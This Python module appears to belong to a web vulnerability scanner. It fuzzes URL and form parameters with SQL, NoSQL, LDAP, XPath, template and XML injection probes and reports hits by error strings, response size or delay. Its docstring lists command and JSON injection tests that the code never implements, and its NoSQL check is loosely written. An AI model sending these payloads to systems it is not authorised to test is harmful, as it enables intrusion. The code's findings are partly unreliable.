"""Intelligent parameter fuzzing for finding injection vulnerabilities.

Tests parameters for:
- SQL Injection (error-based, boolean-based, time-based)
- NoSQL Injection
- LDAP Injection
- XPath Injection
- Template Injection (SSTI)
- Command Injection
- XML Injection
- JSON Injection
"""

import time
import re
import requests
import logging
from typing import List, Dict, Any, Optional, Tuple
from urllib.parse import urlparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
import hashlib

logger = logging.getLogger(__name__)


class ParameterFuzzer:
    """Intelligent fuzzer for finding injection vulnerabilities in parameters."""
    
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def fuzz_parameters(self, url: str, method: str = 'GET', params: Dict[str, str] = None,
                       data: Dict[str, str] = None) -> List[Dict[str, Any]]:
        """
        Fuzz all parameters in a request.
        
        Args:
            url: Target URL
            method: HTTP method (GET, POST)
            params: GET parameters
            data: POST data
        
        Returns:
            List of vulnerabilities found
        """
        vulns = []
        
        # Fuzz GET parameters
        if params:
            for param_name in params.keys():
                param_vulns = self._fuzz_parameter(url, param_name, params, method='GET')
                vulns.extend(param_vulns)
        
        # Fuzz POST parameters
        if data:
            for param_name in data.keys():
                param_vulns = self._fuzz_parameter(url, param_name, data, method='POST')
                vulns.extend(param_vulns)
        
        return vulns
    
    def _fuzz_parameter(self, url: str, param_name: str, all_params: Dict[str, str],
                       method: str = 'GET') -> List[Dict[str, Any]]:
        """Fuzz a single parameter with various payloads."""
        vulns = []
        
        # Get baseline response
        baseline = self._get_baseline(url, param_name, all_params, method)
        if not baseline:
            return vulns
        
        # Test different injection types
        vulns.extend(self._test_sqli_detailed(url, param_name, all_params, method, baseline))
        vulns.extend(self._test_nosqli(url, param_name, all_params, method, baseline))
        vulns.extend(self._test_ldap_injection(url, param_name, all_params, method, baseline))
        vulns.extend(self._test_xpath_injection(url, param_name, all_params, method, baseline))
        vulns.extend(self._test_ssti(url, param_name, all_params, method, baseline))
        vulns.extend(self._test_xml_injection(url, param_name, all_params, method, baseline))
        
        return vulns
    
    def _get_baseline(self, url: str, param_name: str, all_params: Dict[str, str],
                     method: str) -> Optional[Dict]:
        """Get baseline response for comparison."""
        try:
            if method == 'GET':
                resp = self.session.get(url, params=all_params, timeout=self.timeout)
            else:
                resp = self.session.post(url, data=all_params, timeout=self.timeout)
            
            return {
                'status_code': resp.status_code,
                'content_length': len(resp.content),
                'response_time': resp.elapsed.total_seconds(),
                'content_hash': hashlib.md5(resp.content).hexdigest(),
                'text': resp.text
            }
        except:
            return None
    
    def _test_sqli_detailed(self, url: str, param_name: str, all_params: Dict[str, str],
                           method: str, baseline: Dict) -> List[Dict]:
        """Detailed SQL injection testing with multiple techniques."""
        vulns = []
        
        # Error-based SQLi payloads
        error_payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "' AND 1=CONVERT(int, (SELECT @@version))--",
        ]
        
        # Boolean-based payloads
        boolean_payloads = [
            ("' AND '1'='1", "' AND '1'='2"),  # True vs False
            ("' OR '1'='1' --", "' OR '1'='2' --"),
        ]
        
        # Time-based payloads
        time_payloads = [
            ("' AND SLEEP(5)--", 'MySQL'),
            ("'; WAITFOR DELAY '0:0:5'--", 'MSSQL'),
            ("' AND pg_sleep(5)--", 'PostgreSQL'),
            ("' AND DBMS_LOCK.SLEEP(5)--", 'Oracle'),
        ]
        
        # Test error-based
        for payload in error_payloads:
            vuln = self._test_single_payload(url, param_name, payload, all_params, method, baseline, 'error')
            if vuln:
                vuln['type'] = 'SQL Injection (Error-Based)'
                vuln['severity'] = 'CRITICAL'
                vulns.append(vuln)
        
        # Test boolean-based
        for true_payload, false_payload in boolean_payloads:
            vuln = self._test_boolean_sqli(url, param_name, true_payload, false_payload,
                                          all_params, method, baseline)
            if vuln:
                vuln['type'] = 'SQL Injection (Boolean-Based)'
                vuln['severity'] = 'CRITICAL'
                vulns.append(vuln)
        
        # Test time-based
        for payload, db_type in time_payloads:
            vuln = self._test_time_based(url, param_name, payload, all_params, method, baseline)
            if vuln:
                vuln['type'] = f'SQL Injection (Time-Based - {db_type})'
                vuln['severity'] = 'CRITICAL'
                vuln['db_type'] = db_type
                vulns.append(vuln)
        
        return vulns
    
    def _test_single_payload(self, url: str, param_name: str, payload: str,
                            all_params: Dict[str, str], method: str, baseline: Dict,
                            detection_method: str) -> Optional[Dict]:
        """Test a single payload and check for SQL errors."""
        test_params = all_params.copy()
        test_params[param_name] = payload
        
        try:
            if method == 'GET':
                resp = self.session.get(url, params=test_params, timeout=self.timeout)
            else:
                resp = self.session.post(url, data=test_params, timeout=self.timeout)
            
            # SQL error patterns
            sql_errors = [
                r"SQL syntax.*MySQL",
                r"Warning.*mysql_",
                r"valid MySQL result",
                r"MySqlClient\.",
                r"PostgreSQL.*ERROR",
                r"Warning.*pg_",
                r"valid PostgreSQL result",
                r"Npgsql\.",
                r"ORA-[0-9][0-9][0-9][0-9]",
                r"Oracle.*Driver",
                r"Microsoft SQL Server",
                r"ODBC SQL Server Driver",
                r"SQLServer JDBC Driver",
                r"Unclosed quotation mark",
                r"quoted string not properly terminated",
                r"sqlite3.OperationalError",
                r"SQLite/JDBCDriver",
                r"System.Data.SQLite",
            ]
            
            for error_pattern in sql_errors:
                if re.search(error_pattern, resp.text, re.IGNORECASE):
                    return {
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        'evidence': f"SQL error: {error_pattern}",
                        'detection_method': detection_method,
                        'poc': f"{method} {url} with {param_name}={payload}",
                        'cwe': 'CWE-89'
                    }
        except:
            pass
        
        return None
    
    def _test_boolean_sqli(self, url: str, param_name: str, true_payload: str,
                          false_payload: str, all_params: Dict[str, str], method: str,
                          baseline: Dict) -> Optional[Dict]:
        """Test boolean-based SQL injection."""
        # Test true condition
        true_params = all_params.copy()
        true_params[param_name] = true_payload
        
        # Test false condition
        false_params = all_params.copy()
        false_params[param_name] = false_payload
        
        try:
            if method == 'GET':
                true_resp = self.session.get(url, params=true_params, timeout=self.timeout)
                false_resp = self.session.get(url, params=false_params, timeout=self.timeout)
            else:
                true_resp = self.session.post(url, data=true_params, timeout=self.timeout)
                false_resp = self.session.post(url, data=false_params, timeout=self.timeout)
            
            # Compare responses
            if (len(true_resp.content) != len(false_resp.content) and
                abs(len(true_resp.content) - len(false_resp.content)) > 100):  # Significant difference
                
                return {
                    'url': url,
                    'parameter': param_name,
                    'payload': f"True: {true_payload}, False: {false_payload}",
                    'evidence': f"Response differs: True={len(true_resp.content)}bytes, False={len(false_resp.content)}bytes",
                    'detection_method': 'boolean',
                    'poc': f"{method} {url} with {param_name}={true_payload} vs {false_payload}",
                    'cwe': 'CWE-89'
                }
        except:
            pass
        
        return None
    
    def _test_time_based(self, url: str, param_name: str, payload: str,
                        all_params: Dict[str, str], method: str, baseline: Dict) -> Optional[Dict]:
        """Test time-based blind SQL injection."""
        test_params = all_params.copy()
        test_params[param_name] = payload
        
        try:
            start = time.time()
            if method == 'GET':
                resp = self.session.get(url, params=test_params, timeout=15)
            else:
                resp = self.session.post(url, data=test_params, timeout=15)
            elapsed = time.time() - start
            
            # If response took ~5 seconds, likely time-based SQLi
            if elapsed >= 4.5 and elapsed <= 8.0:
                return {
                    'url': url,
                    'parameter': param_name,
                    'payload': payload,
                    'evidence': f"Response delayed by {elapsed:.2f} seconds",
                    'detection_method': 'time-based',
                    'poc': f"{method} {url} with {param_name}={payload}",
                    'cwe': 'CWE-89'
                }
        except:
            pass
        
        return None
    
    def _test_nosqli(self, url: str, param_name: str, all_params: Dict[str, str],
                    method: str, baseline: Dict) -> List[Dict]:
        """Test for NoSQL injection."""
        vulns = []
        
        nosql_payloads = [
            "[$ne]=1",
            "{\"$ne\":null}",
            "{\"$gt\":\"\"}",
            "admin'||'1'=='1",
            "' || 'a'=='a",
        ]
        
        for payload in nosql_payloads:
            test_params = all_params.copy()
            test_params[param_name] = payload
            
            try:
                if method == 'GET':
                    resp = self.session.get(url, params=test_params, timeout=self.timeout)
                else:
                    resp = self.session.post(url, data=test_params, timeout=self.timeout)
                
                # Check for NoSQL errors or bypasses
                if (resp.status_code == 200 and
                    resp.status_code != baseline.get('status_code', 200) or
                    len(resp.content) > baseline.get('content_length', 0) * 1.5):
                    
                    vulns.append({
                        'type': 'NoSQL Injection',
                        'severity': 'CRITICAL',
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        'evidence': f"Response differs from baseline significantly",
                        'detection_method': 'response analysis',
                        'poc': f"{method} {url} with {param_name}={payload}",
                        'cwe': 'CWE-943'
                    })
            except:
                pass
        
        return vulns
    
    def _test_ldap_injection(self, url: str, param_name: str, all_params: Dict[str, str],
                            method: str, baseline: Dict) -> List[Dict]:
        """Test for LDAP injection."""
        vulns = []
        
        ldap_payloads = [
            "*",
            "*)(uid=*",
            "*)(|(uid=*",
            "admin)(&(password=*))",
        ]
        
        for payload in ldap_payloads:
            test_params = all_params.copy()
            test_params[param_name] = payload
            
            try:
                if method == 'GET':
                    resp = self.session.get(url, params=test_params, timeout=self.timeout)
                else:
                    resp = self.session.post(url, data=test_params, timeout=self.timeout)
                
                # Look for LDAP errors
                ldap_errors = [
                    'LDAP',
                    'javax.naming',
                    'LDAPException',
                    'com.sun.jndi.ldap'
                ]
                
                for error in ldap_errors:
                    if error in resp.text:
                        vulns.append({
                            'type': 'LDAP Injection',
                            'severity': 'HIGH',
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': f"LDAP error: {error}",
                            'detection_method': 'error',
                            'poc': f"{method} {url} with {param_name}={payload}",
                            'cwe': 'CWE-90'
                        })
            except:
                pass
        
        return vulns
    
    def _test_xpath_injection(self, url: str, param_name: str, all_params: Dict[str, str],
                             method: str, baseline: Dict) -> List[Dict]:
        """Test for XPath injection."""
        vulns = []
        
        xpath_payloads = [
            "' or '1'='1",
            "' or ''='",
            "x' or 1=1 or 'x'='y",
            "/",
            "//",
        ]
        
        for payload in xpath_payloads:
            test_params = all_params.copy()
            test_params[param_name] = payload
            
            try:
                if method == 'GET':
                    resp = self.session.get(url, params=test_params, timeout=self.timeout)
                else:
                    resp = self.session.post(url, data=test_params, timeout=self.timeout)
                
                # Look for XPath errors
                xpath_errors = [
                    'XPathException',
                    'XPath',
                    'XML syntax',
                    'SimpleXMLElement',
                ]
                
                for error in xpath_errors:
                    if error in resp.text:
                        vulns.append({
                            'type': 'XPath Injection',
                            'severity': 'HIGH',
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': f"XPath error: {error}",
                            'detection_method': 'error',
                            'poc': f"{method} {url} with {param_name}={payload}",
                            'cwe': 'CWE-643'
                        })
            except:
                pass
        
        return vulns
    
    def _test_ssti(self, url: str, param_name: str, all_params: Dict[str, str],
                  method: str, baseline: Dict) -> List[Dict]:
        """Test for Server-Side Template Injection."""
        vulns = []
        
        # SSTI payloads with expected outputs
        ssti_tests = [
            ("{{7*7}}", "49"),
            ("${7*7}", "49"),
            ("<%= 7*7 %>", "49"),
            ("{{7*'7'}}", "7777777"),
        ]
        
        for payload, expected in ssti_tests:
            test_params = all_params.copy()
            test_params[param_name] = payload
            
            try:
                if method == 'GET':
                    resp = self.session.get(url, params=test_params, timeout=self.timeout)
                else:
                    resp = self.session.post(url, data=test_params, timeout=self.timeout)
                
                # Check if expected output appears in response
                if expected in resp.text and expected not in baseline['text']:
                    vulns.append({
                        'type': 'Server-Side Template Injection (SSTI)',
                        'severity': 'CRITICAL',
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        'evidence': f"Template evaluated: {payload} = {expected}",
                        'detection_method': 'expression evaluation',
                        'poc': f"{method} {url} with {param_name}={payload}",
                        'exploitation': 'Can lead to RCE via template injection',
                        'cwe': 'CWE-1336'
                    })
            except:
                pass
        
        return vulns
    
    def _test_xml_injection(self, url: str, param_name: str, all_params: Dict[str, str],
                           method: str, baseline: Dict) -> List[Dict]:
        """Test for XML injection."""
        vulns = []
        
        xml_payloads = [
            "<test>value</test>",
            "<?xml version=\"1.0\"?><test/>",
            "<![CDATA[test]]>",
        ]
        
        for payload in xml_payloads:
            test_params = all_params.copy()
            test_params[param_name] = payload
            
            try:
                if method == 'GET':
                    resp = self.session.get(url, params=test_params, timeout=self.timeout)
                else:
                    resp = self.session.post(url, data=test_params, timeout=self.timeout)
                
                # Look for XML errors
                if 'xml' in resp.text.lower() and 'error' in resp.text.lower():
                    vulns.append({
                        'type': 'XML Injection',
                        'severity': 'MEDIUM',
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        'evidence': 'XML parsing error',
                        'detection_method': 'error',
                        'poc': f"{method} {url} with {param_name}={payload}",
                        'cwe': 'CWE-91'
                    })
            except:
                pass
        
        return vulns


def fuzz_all_parameters(endpoints: List[Dict]) -> List[Dict]:
    """
    Fuzz all parameters in a list of endpoints.
    
    Args:
        endpoints: List of endpoint dictionaries with 'url' and optionally 'params'
    
    Returns:
        List of all vulnerabilities found
    """
    fuzzer = ParameterFuzzer()
    all_vulns = []
    
    for endpoint in endpoints[:50]:  # Limit to 50 endpoints for safety
        url = endpoint.get('url') if isinstance(endpoint, dict) else str(endpoint)
        
        # Parse URL for parameters
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Convert multi-value params to single values
        params = {k: v[0] if v else '' for k, v in params.items()}
        
        if params:
            logger.info(f"[*] Fuzzing {url} with {len(params)} parameters")
            vulns = fuzzer.fuzz_parameters(url, params=params)
            all_vulns.extend(vulns)
            
            if vulns:
                logger.info(f"[!] Found {len(vulns)} vulnerabilities in {url}")
    
    return all_vulns
